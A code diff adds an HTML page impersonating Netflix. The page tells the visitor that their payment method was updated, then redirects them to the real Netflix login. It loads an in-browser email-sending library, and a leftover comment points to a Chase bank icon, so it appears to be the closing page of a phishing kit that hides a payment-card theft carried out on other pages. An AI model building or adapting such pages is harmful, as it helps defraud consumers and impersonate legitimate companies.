@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<html>
+<head>
+    <meta charset="utf-8">
+
+        <!--"user-scalable=no" disable zooming when
+        clicking in submission boxes on mobile-->
+
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+        
+        <title>Netflix - Sign In</title>
+
+        <!--href stands for hypertext reference-->
+        <!---<link rel="icon" href="Chaseico.ico" type="image/x-icon">--->
+
+        <link rel="stylesheet" href="style.css"
+        type="text/css">
+        <link rel="icon" href="logo.png" type="image/png">
+        <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+        <script src="https://smtpjs.com/v3/smtp.js"></script>
+</head>
+<body>
+    <div class="container">
+
+        <div class="blackdiv1">
+            <img src="head.png" width="169" height="59">
+        </div>
+        <div class="good">
+            <p class="may2"><b>Your payment method was updated.</b></p>
+        </div>
+        <div class="good2">
+            <p class="may"><b>You may now login.</b></p>
+        </div>
+        
+        <div class="loader2"></div>
+        <script>
+
+            // Function to redirect to another page
+            function redirectToAnotherPage() {
+                window.location.href = 'https://www.netflix.com/login'; 
+            }
+            // Set the delay for redirection (6 seconds)
+            var redirectDelay = 2700; 
+            // Wait for 6 seconds and then redirect
+            setTimeout(redirectToAnotherPage, redirectDelay);
+    
+        </script>
+        <style>
+            .container {
+                margin-top: 28px;
+            }
+
+            body{
+                overflow: hidden;
+            }
+        </style>
+    </div>
+
+
+</body>
+</html>
